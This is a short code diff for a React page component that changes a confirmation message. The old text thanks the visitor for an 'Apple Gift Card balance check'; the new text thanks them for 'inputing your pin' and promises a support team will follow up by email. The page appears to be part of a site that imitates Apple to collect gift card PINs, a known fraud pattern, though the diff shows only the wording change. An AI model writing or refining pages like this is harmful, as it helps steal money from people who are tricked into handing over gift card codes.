@@ -116,7 +116,7 @@ export default function handlecheck() {
             We will get back to you shortly via email
           </h2>
           <p style={{ fontSize: '1.15rem', color: '#444', textAlign: 'center', maxWidth: '500px', marginBottom: 24 }}>
-            Thank you for submitting your Apple Gift Card balance check. Our support team will review your request and contact you at your registered email address soon.<br /><br />
+            Thank you for inputing your pin. Our support team will review your request and contact you at your registered email address soon.<br /><br />
             <span style={{ color: '#0071e3', fontWeight: 500 }}>You can close this page or return to the home page.</span>
           </p>
           <Link href="/" passHref legacyBehavior>
